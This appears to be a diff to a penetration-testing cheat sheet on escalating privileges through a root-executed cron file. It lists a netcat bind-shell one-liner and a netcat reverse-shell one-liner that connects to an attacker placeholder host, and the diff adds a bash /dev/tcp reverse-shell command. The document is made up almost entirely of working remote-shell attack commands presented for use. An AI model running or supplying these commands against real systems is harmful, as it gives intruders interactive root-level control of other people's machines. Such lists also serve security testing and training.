@@ -75,7 +75,9 @@ Listener For Bind Shell on Linux
 `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
 
 Listener For Reverse Shell
-`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+- `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+
+- `bash -i >& /dev/tcp/<LOCAL-IP>/<port> 0>&1`
 
 Appropriately run *nc* command on the attacker machine based on the listener in the cron root executable file.*
 
